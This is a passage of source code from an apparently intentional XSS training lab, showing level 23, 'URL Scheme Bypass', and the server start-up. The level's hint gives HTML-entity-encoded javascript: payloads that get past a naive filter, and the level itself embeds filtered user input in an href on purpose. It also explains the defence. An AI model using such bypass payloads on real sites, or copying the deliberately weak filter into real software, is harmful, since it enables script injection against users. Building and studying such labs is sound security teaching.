      <form method="GET">
        <input type="text" name="url" placeholder="URL..." value="">
        <button type="submit">Submit</button>
      </form>
      <div class="output"><p style="color:#f85149;">Blocked: javascript: protocol detected.</p></div>`
    ));
    return;
  }

  const hasUrl = url.length > 0;
  res.send(levelPage(
    'URL Scheme Bypass', 23, 'Expert',
    '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> blocked (case-insensitive). Input is placed into an <code>&lt;a href&gt;</code>.',
    'The filter checks for <code>javascript:</code> as a literal string in the raw input. But HTML attribute values are <strong>entity-decoded by the browser</strong> before the URL scheme is interpreted. Encode any character of "javascript:" using HTML entities: <code>&amp;#106;avascript:alert(1)</code> or <code>&amp;#x6A;avascript:alert(1)</code>. The server sees <code>&amp;#106;avascript:</code> (no literal "javascript:"), but the browser decodes it to <code>javascript:</code> and executes it when clicked.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL. The server blocks script tags, event handlers, and <code>javascript:</code>. Your URL is placed into a clickable link.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: URL Scheme Bypass via Entity Encoding</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">When user input is placed into an HTML attribute like <code>href="..."</code>, the browser performs <strong>HTML entity decoding</strong> on the attribute value before interpreting it as a URL. This means <code>&amp;#106;</code> (the HTML entity for "j") becomes "j" in the browser's URL parser. A server-side filter that checks the raw string for <code>javascript:</code> won't find a match if the attacker uses <code>&amp;#106;avascript:</code> or <code>&amp;#x6A;avascript:</code>. The browser, however, decodes the entity and sees <code>javascript:</code> — executing the code when the link is clicked. This is a fundamental mismatch between server-side string matching and browser-side HTML parsing. Defense: decode all entities server-side before checking, or parse the URL properly and allowlist only <code>http:</code> and <code>https:</code> schemes.</p>
    </div>
    <form method="GET">
      <input type="text" name="url" placeholder="URL..." value="">
      <button type="submit">Submit</button>
    </form>
    ${hasUrl ? `<div class="output"><p>Click the link:</p><a href="${filtered}" style="color:#58a6ff;font-size:1.1rem;font-weight:600;">Visit Link &rarr;</a></div>` : '<div class="output"><p style="color:#484f58;">Enter a URL to create a link.</p></div>'}`
  ));
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
  console.log(`\n  XSS Training Lab running at http://localhost:${PORT}\n`);
  console.log(`  Levels 1-23 available. Start at Level 1 and work your way up.\n`);
});
